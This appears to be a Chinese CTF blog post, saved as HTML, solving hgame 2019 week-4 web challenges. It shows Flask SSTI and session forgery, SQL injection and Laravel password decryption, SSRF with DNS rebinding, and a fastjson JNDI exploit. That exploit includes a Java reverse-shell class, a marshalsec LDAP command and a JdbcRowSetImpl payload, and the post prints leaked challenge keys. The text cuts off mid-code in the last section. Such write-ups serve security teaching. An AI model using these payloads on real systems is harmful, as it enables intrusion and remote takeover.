@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="happy python这题就是很普遍的session伪造，首先在url后面加49发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了解密一下session猜测是不是将user_id改成1就能以admin的身份登进去，现在就要想办法拿到secret_key了尝试了一下，发现url_for还在，就用url_for去拿secret_key，payload如下1url_for.__">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 hgame week4">
+<meta property="og:url" content="https://xi4or0uji.github.io/2019/03/11/2019-3-11-2019-hgame-week4/index.html">
+<meta property="og:site_name" content="蒟蒻的ctf博客">
+<meta property="og:description" content="happy python这题就是很普遍的session伪造，首先在url后面加49发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了解密一下session猜测是不是将user_id改成1就能以admin的身份登进去，现在就要想办法拿到secret_key了尝试了一下，发现url_for还在，就用url_for去拿secret_key，payload如下1url_for.__">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/17.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/18.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/12.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/13.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/14.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/15.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/hgame/16.png">
+<meta property="og:updated_time" content="2019-03-15T08:49:00.243Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 hgame week4">
+<meta name="twitter:description" content="happy python这题就是很普遍的session伪造，首先在url后面加49发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了解密一下session猜测是不是将user_id改成1就能以admin的身份登进去，现在就要想办法拿到secret_key了尝试了一下，发现url_for还在，就用url_for去拿secret_key，payload如下1url_for.__">
+<meta name="twitter:image" content="https://xi4or0uji.github.io/images/hgame/17.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://xi4or0uji.github.io/2019/03/11/2019-3-11-2019-hgame-week4/">
+
+
+
+
+
+  <title>2019 hgame week4 | 蒟蒻的ctf博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">蒟蒻的ctf博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xi4or0uji.github.io/2019/03/11/2019-3-11-2019-hgame-week4/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xi4or0uji">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蒟蒻的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019 hgame week4</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-11T09:19:14+08:00">
+                2019-03-11
+              </time>
+            
+
+            
+
+            
+          </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/11/2019-3-11-2019-hgame-week4/" class="leancloud_visitors" data-flag-title="2019 hgame week4">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="happy-python"><a href="#happy-python" class="headerlink" title="happy python"></a>happy python</h4><p>这题就是很普遍的session伪造，首先在url后面加<code>49</code>发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了<br>解密一下session<br><img src="/images/hgame/17.png" alt=""><br>猜测是不是将<code>user_id</code>改成<code>1</code>就能以admin的身份登进去，现在就要想办法拿到<code>secret_key</code>了<br>尝试了一下，发现<code>url_for</code>还在，就用<code>url_for</code>去拿<code>secret_key</code>，payload如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'current_app'</span>].config</span><br></pre></td></tr></table></figure></p>
+<p>然后得到回显<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'CSRF_ENABLED': True, 'SQLALCHEMY_DATABASE_URI': 'mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame', 'SQLALCHEMY_TRACK_MODIFICATIONS': True, 'WTF_CSRF_ENABLED': True, 'WTF_CSRF_CHECK_DEFAULT': True, 'WTF_CSRF_METHODS': &#123;'PUT', 'DELETE', 'POST', 'PATCH'&#125;, 'WTF_CSRF_FIELD_NAME': 'csrf_token', 'WTF_CSRF_HEADERS': ['X-CSRFToken', 'X-CSRF-Token'], 'WTF_CSRF_TIME_LIMIT': 3600, 'WTF_CSRF_SSL_STRICT': True, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False&#125;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>拿到<code>secret_key</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'SECRET_KEY': '9RxdzNwq7!nOoK3*'</span><br></pre></td></tr></table></figure></p>
+<p>接着就是伪造<br>然后就能拿到session了<br><img src="/images/hgame/18.png" alt=""><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k9g-fsAkgo_Vg.D2qpTQ.OJF7PpG3QqUlvvBoSs3wQ1wL2eM</span><br></pre></td></tr></table></figure></p>
+<p>登录进去以后getflag<code>hgame{Qu_bu_la1_m1ng_z1_14}</code>  </p>
+<h4 id="happy-php"><a href="#happy-php" class="headerlink" title="happy php"></a>happy php</h4><p>源码放去了github<code>https://github.com/Lou00/laravel</code>，在源码中看到<br>在<code>app/Http/Controllers/SessionsController.php</code>可以看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $credentials = <span class="keyword">$this</span>-&gt;validate($request, [</span><br><span class="line">            <span class="string">'email'</span> =&gt; <span class="string">'required|email|max:100'</span>,</span><br><span class="line">            <span class="string">'password'</span> =&gt; <span class="string">'required'</span></span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Auth::attempt($credentials)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Auth::user()-&gt;id ===<span class="number">1</span>)&#123;</span><br><span class="line">                session()-&gt;flash(<span class="string">'info'</span>,<span class="string">'flag :******'</span>);</span><br><span class="line">                <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $name = DB::select(<span class="string">"SELECT name FROM `users` WHERE `name`='"</span>.Auth::user()-&gt;name.<span class="string">"'"</span>);</span><br><span class="line">            session()-&gt;flash(<span class="string">'info'</span>, <span class="string">'hello '</span>.$name[<span class="number">0</span>]-&gt;name);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;route(<span class="string">'users.show'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            session()-&gt;flash(<span class="string">'danger'</span>, <span class="string">'sorry,login failed'</span>);</span><br><span class="line">            <span class="keyword">return</span> redirect()-&gt;back()-&gt;withInput();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里有个name的注入点，来个账号测试一下<code>amdin&#39; or &#39;1&#39;=&#39;1</code>，发现确实可以以admin的身份登录进去<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' union select password From `users` WHERE `id`='</span><span class="number">1</span><span class="string">' LIMIE 0,1;#'</span></span><br><span class="line">读到密码eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==</span><br><span class="line">admin<span class="string">' union select email FROM `users` WHERE `id`='</span><span class="number">1</span><span class="string">' LIMIT 0,1;#'</span></span><br><span class="line">读到邮箱admin@hgame.com</span><br></pre></td></tr></table></figure></p>
+<p>base64解码一下密码是<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"iv":"rnVrqfCvfJgnvSTi9z7KLw==","value":"EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=","mac":"56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af"&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在github的commit看到这段<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:<span class="number">9</span>JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</span><br><span class="line">APP_DEBUG=<span class="keyword">true</span></span><br><span class="line">APP_URL=http:<span class="comment">//localhost</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来就是要想办法解密密码，我们有的信息<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">hey = <span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">iv = <span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">value = <span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span></span></span><br></pre></td></tr></table></figure></p>
+<p>然后是jio本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c)</span>:</span></span><br><span class="line">	c = base64.b64decode(c)</span><br><span class="line">	iv = base64.b64decode(<span class="string">'rnVrqfCvfJgnvSTi9z7KLw=='</span>)</span><br><span class="line">	key = AES.new(base64.b64decode(<span class="string">'9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='</span>), AES.MODE_CBC,iv)</span><br><span class="line">	<span class="keyword">return</span> key.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> dec(<span class="string">'EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods='</span>)</span><br></pre></td></tr></table></figure></p>
+<p>然后就获得密码<code>9pqfPIer0Ir9UUfR</code>，接着登录进去就行  </p>
+<h4 id="happy-java"><a href="#happy-java" class="headerlink" title="happy java"></a>happy java</h4><p>题目一开始提示说flag在hgame_flag目录下<br><img src="/images/hgame/12.png" alt=""><br>直接访问发现是404，尝试扫一下端口<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -p0-65535 119.28.26.122</span><br><span class="line"><span class="meta">#</span><span class="bash">结果</span></span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1025/tcp  filtered NFS-or-IIS</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">9876/tcp  open     sd</span><br><span class="line">31337/tcp open     Elite</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，还有一个9876端口开放，扫后台扫到一个mappings<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	"/webjars/**":&#123;</span><br><span class="line">		"bean":"resourceHandlerMapping"</span><br><span class="line">	&#125;,</span><br><span class="line">	"/**":&#123;</span><br><span class="line">		"bean":"resourceHandlerMapping"</span><br><span class="line">	&#125;,</span><br><span class="line">	"/**/favicon.ico":&#123;</span><br><span class="line">		"bean":"faviconHandlerMapping"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/index],methods=[GET]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public java.lang.String me.lightless.happyjava.controller.MainController.Index()"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/you_will_never_find_this_interface],methods=[GET]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/secret_flag_here],methods=[GET]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/error],methods=[GET]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/error],produces=[text/html]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)"</span><br><span class="line">	&#125;,</span><br><span class="line">	"&#123;[/error]&#125;":&#123;</span><br><span class="line">		"bean":"requestMappingHandlerMapping",</span><br><span class="line">		"method":"public org.springframework.http.ResponseEntity&lt;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)"&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>访问<code>secret_flag_here</code>可以看到返回一个只允许本地访问的页面<br><img src="/images/hgame/13.png" alt=""><br>试了一堆改ip操作都不行，看到还有一个<code>you_will_never_find_this_interface</code>，访问一下<br><img src="/images/hgame/14.png" alt=""><br>看到有url，可以确定是要ssrf了，尝试一下url参数加个127.0.0.1，发现会返回eval，这里需要用dns-rebinding去绕过<br><img src="/images/hgame/15.png" alt=""><br>然后发包去intruder查看结果<br><img src="/images/hgame/16.png" alt=""><br>发现确实可以绕过他的检测，接下来就是fastjson的反序列化的利用了<br>exp如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -c \"sh &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1\""</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在vps上下载安装好<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>提供好ldap服务，<code>mvn clean package -DskipTests</code>编译好，也把Exploit.java编译好，在控制台敲出<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit</span><br></pre></td></tr></table></figure></p>
+<p>在一个端口起好http服务用来下载Exploit.java，然后发送下面的payload（要二次urlencode）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your_ip:1389/Exploit","autoCommit":true&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后就能get到shell了  </p>
+<h4 id="happy-go"><a href="#happy-go" class="headerlink" title="happy go"></a>happy go</h4><p>简单试下网站，有登录注册上传头像和留言板这些功能，同时也泄露了源码<br>看源码可以看见<br>admincontroller可以看到有一个删除头像的功能<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *UserDelController)</span> <span class="title">Get</span><span class="params">()</span></span> &#123;</span><br><span class="line">	uid := u.GetSession(<span class="string">"uid"</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="literal">nil</span> &#123;</span><br><span class="line">		u.Abort(<span class="string">"500"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid.(<span class="keyword">int</span>) != <span class="number">1</span> &#123;</span><br><span class="line">		u.Redirect(<span class="string">"/"</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	id := u.Ctx.Input.Param(<span class="string">":id"</span>)</span><br><span class="line">	i, _ := strconv.Atoi(id)</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">1</span> &#123;</span><br><span class="line">		u.Redirect(<span class="string">"/admin"</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	o := orm.NewOrm()</span><br><span class="line">	user := models.Users&#123;Id:i&#125;</span><br><span class="line">	err := o.Read(&amp;user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		u.Abort(<span class="string">"500"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> user.Avatar != <span class="string">"/static/img/avatar.jpg"</span> &#123;</span><br><span class="line">		os.Remove(user.Avatar)</span><br><span class="line">	